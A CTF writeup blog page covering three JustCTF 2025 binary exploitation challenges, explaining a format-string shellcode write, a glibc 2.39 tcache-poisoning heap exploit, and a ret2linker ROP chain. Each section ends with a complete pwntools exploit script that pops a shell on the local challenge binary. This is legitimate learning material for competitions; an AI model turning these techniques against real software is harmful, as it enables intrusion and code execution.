---
layout: default
title: "JustCTF 2025 Pwn Writeups"
description: "Writeups of JustCTF 2025 pwn challenges."
og_description: "Writeups of pwn challenges."
og_type: "ctf writeup"
keywords: "writeups,Sarvesh Aadhithya,CTFs, JustCTF, 2025,zoozoo-sec, zoozoo, baby heap, shellcode printer, prospector"

permalink: /writeups/JustCTF2025/
---

<!-- Link Bootstrap CSS (add this to your <head> if it's not already included) -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-tomorrow.min.css" integrity="sha512-kSwGoyIkfz4+hMo5jkJngSByil9jxJPKbweYec/UgS+S1EgE45qm4Gea7Ks2oxQ7qiYyyZRn66A9df2lMtjIsw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="stylesheet" href="{{ '/writeups/writeup-page.css' | relative_url }}" />


<section id="back" class="back">
<div id="challenge-links">
        <h1 class="text"><code>
JustCTF 2025</code></h1>
        <ul>
            <li><a href="#shellcodeprinter"><code>Shellcode Printer</code></a></li>
            <li><a href="#babyheap"><code>Baby Heap</code></a></li>
            <li><a href="#prospector"><code>Prospector</code></a></li>
        </ul>
    </div>
</section>

<section id="back">
<section id="blueback" class="container">
    <div id="shellcodeprinter" class="challenge-section">
        <div class="section-content">
            <b>Name:</b> <span class="text"> Shellcode Printing</span><br>
            <b>Category:</b> Binary Exploitation<br>
            <p><br>
                Here we are again — classic shellcode injection challenge... or is it?<br>
                This one isn’t the "copy-paste shellcode into a buffer and pray" kind of gig.<br>
                Instead of handing us a nice, friendly buffer and saying, <code>“Please inject shellcode here”</code>, this binary decided to play tricks with a format string vulnerability.
            </p>
        </div>
        <div class="section-content">
            <h1>Fmt-String Shenanigans</h1>
            <img src="{{ '/writeups/JustCTF2025/assets/shellcodeprinter.png' | relative_url }}" alt="snippet" class="code-screenshot" />
            <p>
                You’d expect this to be your average <code>printf</code>-style info leak, right?<br>
                Surprise — it’s <code>fprintf()</code> to <code>/dev/null</code>. Yep, all output gone. Poof.<br>
                Any attempt to <code>%p</code>, <code>%s</code>, <code>%n</code>, or <code>%lx</code> your way to memory leaks? Straight into the void.
            </p>
            <p>
                But hold up… just because we can't read, doesn’t mean we can’t write.<br>
                That’s where the beauty lies — <code>fprintf()</code> + format string = write-what-where primitive.<br>
                (Just don’t expect it to hold your hand.)
            </p>
        </div>
        <div class="section-content">
            <h4>Enter mmap()</h4>
            <p>
                So, where are we even writing this shellcode to?<br>
                This binary uses <code>mmap()</code> to allocate a memory region — with RWX permissions — and stores the pointer on the stack.<br>
                Lucky for us, it’s just sitting at <code>rsp + 8</code>, waiting to be used.
            </p>
        </div>
        <div class="section-content">
            <h4>But There’s a Twist…</h4>
            <p>
                You don't get to write the whole shellcode in one go. Why?<br>
                Because this binary is a little extra.<br>
                After each input, the pointer into the <code>mmap</code>’d region gets bumped by 2 bytes.<br>
                So yeah — your write is 2 bytes per input.
            </p>
            <p>
                Still manageable.<br>
                Bonus: The input loop continues until you send a null byte.<br>
                So you can inject shellcode chunks, 2 bytes at a time, with each input round.
            </p>
        </div>
        <div class="section-content">
            <h4>And Then… It Breaks.</h4>
            <p>
                Just as you're about to finish writing your shellcode, the pointer ends up pointing to the end of the mmap'd region.<br>
                When the execution jumps to that pointer — it’s basically trying to run off the end of your shellcode.<br>
                That’s no good.
            </p>
        </div>
        <div class="section-content">
            <h4>The Jump Trick</h4>
            <p>
                Here’s the trick:<br>
                Write a <code>jmp</code> instruction at the end — one that jumps back to the start of your shellcode.<br>
                Since <code>jmp</code> is only 2 bytes (opcode + offset), and the pointer increments by 2 bytes per input, you can place it precisely.<br>
                For this one, we cheat a little — write 3 bytes to land the jump.<br>
                And just like that, execution jumps to the start — and we get the shell.
            </p>
        </div>
        <div class="section-content">
            <div class="h4-wrapper">
                <h4>Exploit Script</h4>
                <button class="copy-btn">Copy</button>
            </div>
<pre><code class="language-python">from pwn import *
import struct

context.arch = "amd64"
context.log_level = "info"

def split_shell(shellcode):
    chunks = [shellcode[i:i+2] for i in range(0, len(shellcode), 2)]
    words = []
    for chunk in chunks:
        if len(chunk) < 2:
            chunk += b'\x00'
        val = struct.unpack('&lt;H', chunk)[0]
        words.append(val)
    return words

def build_fmt_payload(value, offset=6):
    return f"%{value}c%{offset}$hn"

def generate_shellcode():
    return asm('''
        start:
            xor rax, rax
            push rax
            push rax
            pop rsi
            pop rdx
            mov rbx, 0x68732f6e69622f2f
            shr rbx, 8
            push rbx
            mov rdi, rsp
            mov al, 59
            syscall
            nop
            nop
            jmp start
    ''')

def exploit():
    io = process("./shellcode_printer_patched")

    raw_shellcode = generate_shellcode()
    shellcode_to_send = raw_shellcode[:-3]
    splitted = split_shell(shellcode_to_send)

    for i, word in enumerate(splitted):
        fmt = build_fmt_payload(word)
        log.info(f"Sending chunk {i+1}/{len(splitted)}: {fmt}")
        io.sendline(fmt.encode())

    # Final jump back to start
    io.sendline(b"%14674832c%6$n")

    # Null terminator
    io.sendline(b"\x00")
    io.interactive()

if __name__ == "__main__":
    exploit()</code></pre>
        </div>
    </div>
</section>
</section>


<section id="back">
  <section id="blueback" class="container">
    <div id="babyheap" class="challenge-section">
      <div class="section-content">
        <b>Name:</b> <span class="text"> Baby Heap </span><br>
        <b>Category:</b> Binary Exploitation<br>
        <p><br>
          This one looked simple at first glance — but, as usual, it wasn't going to let us off that easy.<br>
          <br>
          Opening the binary in IDA made the vulnerability jump right out — a <strong>Use-After-Free (UAF)</strong> in the <code>delete()</code> function.<br>
          Why? Because the freed pointer isn’t nulled out afterward. Classic mistake.<br>
          <br>
          Sounds like tcache poisoning material.
        </p>
      </div>

      <div class="section-content">
        <h5><code>Checksec</code></h5>
        <pre><code>RELRO:    Full RELRO  
Canary:   Yes  
NX:       Yes  
PIE:      Yes  
SHSTK:    Enabled  
IBT:      Enabled</code></pre>
        <p>
          Yep. All the modern security goodies are turned on.<br>
          So... no GOT overwrite. No return-to-plt. No partial overwrite shenanigans.<br>
          <br>
          And the binary allocates pretty small chunks — so we’re not even getting out of the tcache fastbin area.<br><code>Leak required.</code> No exceptions.
        </p>
      </div>
      <div class="section-content">
        <h2>Welcome to the House... of Something?</h2>
        <p>
          Now, we know there are heap exploitation techniques called “House of X” (<code>Lore</code>, <code>Force</code>, <code>Einherjar</code>, etc.).<br>
          But honestly, I don’t even know what this one would be called.<br>
          <br>
          We’re going to:
          <ul>
            <li>Create a fake chunk</li>
            <li>Force it into the <code>unsorted bin</code></li>
            <li>Leak a libc pointer from the <code>main_arena</code> metadata</li>
          </ul>
          Why does that work?<br>
          Because <code>ptmalloc</code> uses a doubly-linked list for unsorted bins, and the chunk's <code>fd</code> and <code>bk</code> pointers end up pointing directly inside <code>main_arena</code>.<br>
          <code>Beautiful.</code>
        </p>
      </div>
      <div class="section-content">
        <h4>Step 1: Leak Heap Address + Tcache Key</h4>
        <p>
          Using the UAF, we read a freed chunk and get two things:
          <ul>
            <li><code>Tcache key</code> — used for pointer mangling (introduced in glibc 2.32+).</li>
            <li><code>Mangled pointer</code> — XORing this with the key gives us a heap leak.</li>
          </ul>
        </p>
        <h4>Step 2: Tcache Poisoning for Controlled Allocation</h4>
        <p>
          We poison the tcache freelist to get a pointer that overlaps with another chunk. This lets us:
          <ul>
            <li>Corrupt its metadata (e.g., the <code>size</code> field).</li>
            <li>Create a fake chunk header with <code>size &gt; 0x410</code> → ensures it goes to the unsorted bin.</li>
          </ul>
          <br>
          <strong>Important glibc 2.39 checks:</strong>
          <ul>
            <li><code>prev_inuse</code> bit of the next chunk must be <code>1</code>, or you'll hit consolidation checks.</li>
            <li>Next chunk’s <code>prev_size</code> and <code>size</code> fields must line up correctly.</li>
            <li>If you corrupt a chunk’s size, make sure you don't accidentally mark it as <code>IS_MMAPPED</code> or you'll crash.</li>
          </ul>
          <p style="margin-top: 15px;">For a deeper dive into how these checks work internally, you can browse the <a href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html" target="_blank" rel="noopener noreferrer"><code>malloc.c</code></a> source in glibc.</p>
          <img src="{{ '/writeups/JustCTF2025/assets/babyheap1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        </p>
        <h4>Step 3: Trigger Unsorted Bin Insertion</h4>
        <p>
          Now we free our overlapping (victim) chunk with the large fake size → it ends up in the <code>unsorted bin</code>.<br>
          Its <code>fd</code>/<code>bk</code> now point to libc’s <code>main_arena</code>.<br>
          <br>
          <img src="{{ '/writeups/JustCTF2025/assets/babyheap.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          Boom. <strong>Libc leak</strong>.<br>
          From here, we can:
          <ul>
            <li>Compute libc base.</li>
            <li>Poison tcache again — but this time to leak stack address via <code>__environ</code>.</li>
          </ul>
        </p>
        <h4>Step 4: Final Tcache Poisoning – Stack Write</h4>
        <p>
          We tcache-poison again to get an allocation pointing directly to the saved return address on the stack.<br>
          From here, we drop a ROP chain:
          <ul>
            <li><code>pop rdi</code></li>
            <li><code>"/bin/sh"</code></li>
            <li><code>ret</code> (alignment)</li>
            <li><code>system</code></li>
          </ul>
          <br>
          And that’s it — <strong>shell popped.</strong>
        </p>
      </div>
      <div class="section-content">
            <div class="h4-wrapper">
                <h4>Exploit Script</h4>
                <button class="copy-btn">Copy</button>
            </div>
<pre><code class="language-python">from pwn import *

context.binary = exe = ELF('./babyheap_patched', checksec=False)
libc = exe.libc
context.log_level = "info"

# XOR-based pointer mangling (tcache protection)
def mangle(key, addr):
    return key ^ addr

# Allocate chunk
def malloc(idx, data):
    io.sendlineafter(b"> ", b'1')
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

# Free chunk
def free(idx):
    io.sendlineafter(b"> ", b'4')
    io.sendlineafter(b"Index: ", str(idx).encode())

# Read chunk content (8 bytes max expected)
def read(idx):
    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"Index: ", str(idx).encode())
    return io.recvline().strip().ljust(8, b"\x00")

# Overwrite chunk content
def write(idx, data):
    io.sendlineafter(b"> ", b'3')
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

def exploit():
    # Allocate and free chunks to set up leak
    for i in range(2):
        malloc(i, p64(0x11) * 6)
    for i in range(2):
        free(i)

    # Leak tcache key and mangled pointer
    key = u64(read(0))
    mangled = u64(read(1))
    heap_leak = mangled ^ key

    log.success(f"KEY: {hex(key)}")
    log.success(f"MANGLED PTR: {hex(mangled)}")
    log.success(f"HEAP LEAK: {hex(heap_leak)}")

    # Tcache poisoning: overwrite next pointer in tcache entry (index 1)
    write(1, p64(mangle(key, heap_leak + 0x10)))

    # Chunk 2 is dummy to align tcache
    malloc(2, b"dummy")

    # Chunk 3 returns previously poisoned tcache ptr (i.e., index 0 + 16)
    malloc(3, b"victim")

    # Overwrite size field of chunk 0 to 0x421 (fake large chunk)
    write(0, p64(0) + p64(0x421))

    # Allocate and free two more chunks to fill tcache bin for 0x420
    for i in range(4, 6):
        malloc(i, b"dummy")
    for i in range(4, 6):
        free(i)

    # Overwrite next tcache pointer to chunk at heap + 0x420
    target = heap_leak + 0x420
    write(5, p64(mangle(key, target)))

    # Reallocate from poisoned tcache bin
    malloc(6, b"dummy")
    malloc(7, p64(0) + p64(0x11)*5)

    # Free chunk 3 (unsorted bin now) to leak libc via main_arena
    free(3)
    libc_leak = u64(read(3))
    libc.address = libc_leak - 0x203b20
    log.success(f"LIBC BASE: {hex(libc.address)}")

    # Setup tcache poisoining to leak stack address via __environ
    malloc(7, b'8')
    malloc(8, b'9')
    malloc(9, b'10')
    free(8)
    free(9)

    write(9, p64(mangle(key, libc.sym.environ - 0x18)))  # prepare leak from environ
    malloc(10, b'11')
    malloc(11, b'A'*0x18)

    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"Index: ", b'11')
    io.recvuntil(b"A" * 0x18)
    stack_leak = u64(io.recv(6).ljust(8, b'\x00'))

    # Now use tcache poisoning again to write ROP chain to stack
    malloc(13, b'13')
    malloc(14, b'14')
    free(13)
    free(14)

    # Overwrite tcache next ptr to stack - 0x158 (controlled return address)
    write(14, p64(mangle(key, stack_leak - 0x158)))
    malloc(15, b'15') 

    # ROP chain to system("/bin/sh")
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    binsh = next(libc.search(b'/bin/sh\0'))

     # overwrite saved rbp if needed
    payload = flat(
        0,             
        pop_rdi, binsh,
        ret,
        libc.sym.system
    )
    malloc(16, payload)

    # Pop shell
    io.interactive()

def main():
    global io
    io = process(exe.path)
    input(f"[+] PID: {io.pid}")  # for attaching GDB manually
    exploit()

if __name__ == "__main__":
    main()
</code></pre>
</div>
</div>
  </section>
</section>

<section id="back">
  <section id="blueback" class="container">
    <div id="prospector" class="challenge-section">
      <div class="section-content">
        <b>Challenge Name:</b> <span class="text">Prospector</span><br>
        <b>Category:</b> Binary Exploitation
        <p><br>
          This challenge looked quite ugly at first, due to the symbols and function names being stripped.<br><br>
          <h5><code>Checksec</code></h5>
        </p>
        <pre><code>Arch:     amd64
RELRO:    Full RELRO
Canary:   No canary found
NX:       NX enabled
PIE:      PIE enabled
SHSTK:    Enabled
IBT:      Enabled</code></pre>
        <p>
          Nice — no canary! But PIE is enabled, so we’ll probably need a PIE leak. This screams ROP attack — let’s see.
        </p>
      </div>
      <div class="section-content">
        <h2>Reversing the Binary</h2>
        <p>
          Upon loading it into IDA, I noticed something odd: there was no <code>main()</code> function.<br>
          Instead, the binary started from <code>_start</code>, and most of the symbols were stripped — definitely not a standard C binary.<br>
          My guess? This was written in pure assembly or something close to it.<br><br>
          That didn’t stop me. I passed the decompiled output to ChatGPT, which helped me break down each function. With those insights, I renamed all the functions to something more understandable and manageable.
          <img src="{{ '/writeups/JustCTF2025/assets/pro.png' | relative_url }}" alt="snippet" class="code-screenshot" />
        </p>
      </div>
      <div class="section-content">
        <h2>Vulnerability: Buffer Overflow</h2>
        <p>
          Starting from the <code>_start</code> function, I traced through the control flow and noticed something very promising:<br>
          <img src="{{ '/writeups/JustCTF2025/assets/pro1.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          There was a classic buffer overflow vulnerability around line 14 and line 20 in the input parsing logic.<br><br>
          With no stack canary in place, and a PIE-enabled binary, this lined up perfectly for a classic ROP attack — provided we could leak a PIE/libc address.
        </p>
      </div>
      <div class="section-content">
        <h2>Mysterious Condition</h2>
        <p>
          As I continued exploring the binary, I noticed a function </p>
          <img src="{{ '/writeups/JustCTF2025/assets/pro2.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          <p>This function was never called directly, but had a conditional check guarding it:
          <pre><code class="language-c">if ((_DWORD)result == 1)
    return sub_1000(a2);</code></pre>
          And elsewhere:
          <pre><code class="language-c">if (*(_DWORD *)(a1 + 8) == 1)
    sub_1000((__int64)a2);</code></pre>
          In both cases, the condition for calling <code>sub_1000()</code> was a comparison against the value 1. Interesting.
        </p>
      </div>
      <div class="section-content">
        <h4>Exploiting the Overflow for Code Execution</h4>
        <p>
        <img src="{{ '/writeups/JustCTF2025/assets/pro3.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          I discovered that the buffer used to take the input for <code>Nick</code> is located at <code>0x7fffffffe360</code>,
          while the memory being checked for the value <code>1</code> is at <code>0x7fffffffe3a8</code>.<br><br>
          With the overflow primitive, I could write all the way up to that location and overwrite it with <code>1</code>, thereby triggering a call to <code>sub_1000()</code>.<br>
          But why does that matter?
        </p>
      </div>
      <div class="section-content">
        <h2>The Real Leak</h2>
        <p>
          Looking inside <code>sub_1000()</code>, 
          <img src="{{ '/writeups/JustCTF2025/assets/pro5.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          I found that it prints a transformed value derived from a memory address.<br>
          This value — the player's score — was actually a disguised pointer.<br><br>
          The transformation? Some bit shifting and arithmetic, which could be reversed:
        </p>
        <pre><code class="language-python">reverse_score = lambda score: 0x700000000000 | ((score >> 1) << 16)</code></pre>
        <p>
          This function seemed useless at first glance — but in reality, it gave us a leaked pointer, disguised as a score.<br>
          Once reversed, I confirmed the address pointed inside the <code>linker</code> (<code>ld.so</code>).<br>
          <img src="{{ '/writeups/JustCTF2025/assets/pro4.png' | relative_url }}" alt="snippet" class="code-screenshot" />
          That’s right — this was setting up for a <code>ret2linker</code> attack.
        </p>
      </div>
      <div class="section-content">
        <h2>Attack Plan</h2>
        <ul>
          <li><h5>Step 1: Calculate Linker Base Address</h5><br>
            Use the leaked address to compute the base address of the linker by subtracting known offsets (you'll need to extract the same <code>ld.so</code> from the Docker image to match remote offsets).<br><br>
            <em>Be aware:</em> Players in the Discord server <strong>raged</strong> that their exploit broke due to varying linker offsets — likely caused by mismatched kernel versions.<br>
            Thankfully, I mean very thankfully, my WSL kernel version just chilled and gave me consistent offsets.
          </li><br>
          <li><h5>Step 2: ROP Gadgets from the Linker</h5><br>
            Extract ROP gadgets from the linker 
          </li><br>
          <li><h5>Step 3: Multi-Stage ROP Chain</h5>
            <ul>
              <li>Stage 1: Read "/bin/sh" into memory (via read syscall).</li>
              <li>Stage 2: Execute <code>execve("/bin/sh")</code> syscall with that pointer.</li>
            </ul>
          </li>
        </ul>
      </div>
      <div class="section-content">
        <div class="h4-wrapper">
          <h4>Exploit Script</h4>
          <button class="copy-btn">Copy</button>
        </div>
<pre><code class="language-python">#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF('./prospector', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
context.arch = 'amd64'
context.log_level = 'info'  # Set to 'debug' for verbose output

reverse_score = lambda score: 0x700000000000 | ((score >> 1) << 16)

def exploit():
    io = process(exe.path)

    log.info("Leaking score via input overflow...")
    io.sendlineafter(b'Nick: ', b'A' * 72 + p64(1))  # Overflow into score struct
    io.sendlineafter(b'Color: ', b'dummy')      # Trigger the scoring logic

    io.recvuntil(b'score: ')
    score = int(io.recvline().strip())
    log.success(f"Leaked score: {score}")

    leak = reverse_score(score)
    ld.address = leak + 0x3000
    log.success(f"Resolved ld base   @ {hex(ld.address)}")

    # === ROP gadgets from ld.so ===
    pop_rdi = ld.address + 0x3399
    pop_rsi = ld.address + 0x5700
    pop_rdx = ld.address + 0x217bb
    pop_rax = ld.address + 0x15abb
    syscall = ld.address + 0xb879

    log.info("Building stage 1 ROP payload...")
    rop_chain = flat(
        b'\x00' * 0x28,
        p64(leak + 0x40),  # new RBP
        p64(0),               # align stack
        pop_rax, leak,     # dummy rax setup
        pop_rdi, leak + 0x40,
        pop_rsi, 0,
        pop_rdx, leak + 0x40,
        pop_rax, 0x3b         # syscall number for execve
    )

    log.info("Sending stage 1 (ROP chain setup)...")
    io.sendlineafter(b'Color: ', rop_chain)

    log.info("Sending stage 2 (execve syscall)...")
    shell_payload = b"/bin/sh\x00" + p64(syscall)
    io.sendline(shell_payload)

    io.interactive()

if __name__ == "__main__":
    exploit()</code></pre>
      </div>
    </div>
  </section>
</section>



<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js" integrity="sha512-UOoJElONeUNzQbbKQbjldDf9MwOHqxNz49NNJJ1d90yp+X9edsHyJoAs6O4K19CZGaIdjI5ohK+O2y5lBTW6uQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-python.min.js" integrity="sha512-3qtI9+9JXi658yli19POddU1RouYtkTEhTHo6X5ilOvMiDfNvo6GIS6k2Ukrsx8MyaKSXeVrnIWeyH8G5EOyIQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/components/prism-c.min.js" integrity="sha512-EWIJI7uQnA8ClViH2dvhYsNA7PHGSwSg03FAfulqpsFiTPHfhdQIvhkg/l3YpuXOXRF2Dk0NYKIl5zemrl1fmA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script src="{{ '/writeups/copy.js' | relative_url }}"></script>
